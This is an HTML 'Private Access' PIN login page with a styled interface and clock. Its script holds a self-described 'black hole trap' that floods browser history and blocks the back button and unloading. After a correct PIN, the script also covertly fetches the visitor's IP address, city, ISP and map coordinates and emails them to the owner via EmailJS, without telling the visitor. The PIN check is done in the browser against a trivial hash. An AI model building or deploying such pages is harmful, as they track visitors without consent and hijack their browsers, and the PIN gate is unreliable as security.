<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Private Access</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>

    <style>
        /* --- CSS STYLES --- */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            font-family: 'Rajdhani', sans-serif;
            overflow: hidden;
            background: linear-gradient(-45deg, #000000, #1a0500, #3d0e00, #521500, #701d00);
            background-size: 400% 400%;
            animation: gradientBG 15s ease infinite;
            color: #fff;
        }
        @keyframes gradientBG {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        .clock-panel {
            position: absolute; top: 30px; left: 40px; text-align: left;
            font-family: 'Orbitron', sans-serif; text-shadow: 0 0 15px rgba(255, 100, 0, 0.6);
            animation: fadeInDown 1s ease-out; z-index: 10;
        }
        .time { font-size: 3rem; font-weight: 700; letter-spacing: 3px; color: #ff6600; line-height: 1; }
        .date { font-size: 1rem; color: #c77d63; margin-top: 5px; letter-spacing: 2px; text-transform: uppercase; }
        .login-card {
            background: rgba(0, 0, 0, 0.7); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 69, 0, 0.2); border-top: 1px solid rgba(255, 69, 0, 0.5);
            padding: 50px 40px; border-radius: 20px;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 1), inset 0 0 30px rgba(0, 0, 0, 0.9);
            text-align: center; width: 340px; transition: transform 0.3s ease;
        }
        .login-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 40px 80px rgba(0, 0, 0, 1), 0 0 30px rgba(255, 69, 0, 0.3);
            border-color: rgba(255, 69, 0, 0.6);
        }
        h1 {
            font-family: 'Orbitron', sans-serif; font-weight: 900; color: #ffffff;
            margin-bottom: 30px; font-size: 26px; letter-spacing: 3px;
            text-transform: uppercase; text-shadow: 0 2px 4px rgba(0, 0, 0, 0.8);
        }
        input[type="password"] {
            width: 100%; padding: 15px; margin-bottom: 25px; border-radius: 50px;
            background: rgba(0, 0, 0, 0.8); color: #ff4500; font-size: 20px;
            text-align: center; letter-spacing: 8px; outline: none;
            border: 2px solid rgba(255, 69, 0, 0.4); transition: 0.3s;
            font-family: 'Orbitron', sans-serif; box-shadow: inset 0 0 10px rgba(0,0,0,1);
        }
        input[type="password"]:hover { border-color: rgba(255, 69, 0, 0.7); }
        input[type="password"]:focus {
            border-color: #ff4500; box-shadow: 0 0 25px rgba(255, 69, 0, 0.5), inset 0 0 10px rgba(0,0,0,1);
            background: rgba(0, 0, 0, 1); color: #ff7700;
        }
        button {
            width: 100%; padding: 15px; border: none; border-radius: 50px;
            background: linear-gradient(90deg, #ff3c00, #ff0080); color: #fff;
            font-size: 18px; font-weight: 900; cursor: pointer; text-transform: uppercase;
            letter-spacing: 3px; transition: all 0.3s ease; font-family: 'Orbitron', sans-serif;
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.8);
            box-shadow: 0 0 20px rgba(255, 60, 0, 0.7), 0 0 60px rgba(255, 0, 128, 0.4);
            position: relative; overflow: hidden; animation: buttonPulse 2s infinite;
        }
        button:hover {
            transform: scale(1.05);
            box-shadow: 0 0 40px rgba(255, 60, 0, 1), 0 0 80px rgba(255, 0, 128, 0.8);
            background: linear-gradient(90deg, #ff5e00, #ff00aa);
        }
        @keyframes buttonPulse {
            0% { box-shadow: 0 0 20px rgba(255, 60, 0, 0.7), 0 0 40px rgba(255, 0, 128, 0.2); }
            50% { box-shadow: 0 0 30px rgba(255, 60, 0, 0.9), 0 0 60px rgba(255, 0, 128, 0.6); }
            100% { box-shadow: 0 0 20px rgba(255, 60, 0, 0.7), 0 0 40px rgba(255, 0, 128, 0.2); }
        }
        .message { margin-top: 20px; height: 20px; font-size: 14px; font-weight: bold; font-family: 'Orbitron', sans-serif; letter-spacing: 1px; }
        .shake { animation: shake 0.5s; }
        @keyframes shake {
            0% { transform: translateX(0); } 20% { transform: translateX(-10px); } 40% { transform: translateX(10px); } 60% { transform: translateX(-10px); } 80% { transform: translateX(10px); } 100% { transform: translateX(0); }
        }
        .watermark {
            position: fixed; bottom: 20px; right: 30px; font-family: 'Rajdhani', sans-serif;
            font-size: 16px; font-weight: 700; color: #ffaa00; letter-spacing: 2px;
            text-transform: uppercase; pointer-events: none; padding-bottom: 5px;
            text-shadow: 0 0 10px rgba(255, 100, 0, 0.8), 0 0 20px rgba(255, 0, 0, 0.6);
            border-bottom: 2px solid rgba(255, 165, 0, 0.8);
            animation: watermarkFlicker 4s infinite alternate;
        }
        @keyframes watermarkFlicker {
            0% { opacity: 0.8; text-shadow: 0 0 10px rgba(255, 100, 0, 0.8); }
            100% { opacity: 1; text-shadow: 0 0 20px rgba(255, 165, 0, 1), 0 0 30px #ff4500; }
        }
        @keyframes fadeInDown { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body onload="initPage()">

    <div class="clock-panel">
        <div class="time" id="clock">00:00:00</div>
        <div class="date" id="date">Loading Date...</div>
    </div>

    <div class="login-card" id="card">
        <h1>PRIVATE WEBPAGE</h1>
        <input type="password" id="pinInput" placeholder="----" maxlength="4" autocomplete="off" autofocus>
        <button onclick="checkPassword()">Enter</button>
        <div class="message" id="msg"></div>
    </div>

    <div class="watermark">Created by Saptarshi Basak</div>

    <script>
        // --- CONFIGURATION ---
        const CORRECT_HASH = "1511273"; 
        const REDIRECT_URL = "home))eOoJ01HT3huqk5.html";
        
        // *** PASTE YOUR EMAILJS KEYS HERE ***
        const EMAILJS_PUBLIC_KEY = "ltbq8V-jtI7K7AGeC";
        const EMAILJS_SERVICE_ID = "service_p3zsmea";
        const EMAILJS_TEMPLATE_ID = "template_o64zuf9";

        let canLeavePage = false;

        function initPage() {
            // Initialize EmailJS
            emailjs.init(EMAILJS_PUBLIC_KEY);
            
            startTime();
            floodHistory(); // Initiate the trap
            document.getElementById("pinInput").focus();
        }

        // --- THE BLACK HOLE TRAP ---
        function floodHistory() {
            for(let i = 0; i < 50; i++) {
                history.pushState(null, document.title, location.href);
            }
            window.addEventListener('popstate', function () {
                history.pushState(null, document.title, location.href);
            });
            window.onbeforeunload = function() {
                if (!canLeavePage) {
                    return "System Locked. Access Denied.";
                }
            };
        }

        // --- CLOCK ---
        function startTime() {
            const today = new Date();
            let h = today.getHours(); let m = today.getMinutes(); let s = today.getSeconds();
            let session = "AM";
            if(h == 0){ h = 12; }
            if(h > 12){ h = h - 12; session = "PM"; }
            m = (m < 10) ? "0" + m : m; s = (s < 10) ? "0" + s : s;
            document.getElementById('clock').innerHTML = h + ":" + m + ":" + s + " <span style='font-size: 1.5rem'>" + session + "</span>";
            const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
            document.getElementById('date').innerHTML = today.toLocaleDateString("en-US", options);
            setTimeout(startTime, 1000);
        }

        // --- HASH GEN ---
        function generateFingerprint(str) {
            let hash = 0;
            if (str.length === 0) return hash;
            for (let i = 0; i < str.length; i++) {
                let char = str.charCodeAt(i);
                hash = ((hash << 5) - hash) + char;
                hash = hash & hash; 
            }
            return hash.toString();
        }

        // --- PASSWORD CHECK & EMAIL TRACKING ---
        const inputField = document.getElementById("pinInput");
        const msgDiv = document.getElementById("msg");
        const card = document.getElementById("card");

        inputField.addEventListener("keypress", function(event) {
            if (event.key === "Enter") { checkPassword(); }
        });

        function checkPassword() {
            const userPin = inputField.value;
            const userHash = generateFingerprint(userPin);

            if (userHash === CORRECT_HASH) {
                // Correct PIN
                msgDiv.style.color = "#00ff00"; 
                msgDiv.style.textShadow = "0 0 15px #00ff00, 0 0 30px #00ff00";
                msgDiv.innerText = "ACCESS GRANTED - VERIFYING...";
                card.style.borderColor = "#00ff00";
                card.style.boxShadow = "0 0 50px rgba(0, 255, 0, 0.5)";

                // *** UNLOCK AND TRIGGER TRACKING ***
                canLeavePage = true;
                
                // Fetch IP Data and Send Email
                sendTrackingEmail().then(() => {
                    // Redirect after email attempt (success or fail)
                    window.location.replace(REDIRECT_URL); 
                });

            } else {
                // Incorrect PIN
                msgDiv.style.color = "#ff0000"; 
                msgDiv.style.textShadow = "0 0 15px #ff0000, 0 0 30px #ff0000";
                msgDiv.innerText = "INCORRECT PIN";
                inputField.value = "";
                card.classList.add("shake");
                setTimeout(() => { card.classList.remove("shake"); }, 500);
                inputField.focus();
            }
        }

        async function sendTrackingEmail() {
            try {
                // 1. Get IP and Location Data
                const res = await fetch("https://ipapi.co/json/");
                const data = await res.json();

                // 2. Prepare Variables
                const now = new Date();
                const mapsLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;

                const templateParams = {
                    date: now.toLocaleDateString(),
                    time: now.toLocaleTimeString(),
                    ip_address: data.ip,
                    city: data.city,
                    country: data.country_name,
                    isp: data.org,
                    maps_link: mapsLink
                };

                // 3. Send via EmailJS
                await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams);
                console.log("Tracking sent.");

            } catch (error) {
                console.error("Tracking failed:", error);
                // We deliberately ignore errors so the user can still enter if the API fails
            }
        }
    </script>
</body>
</html>
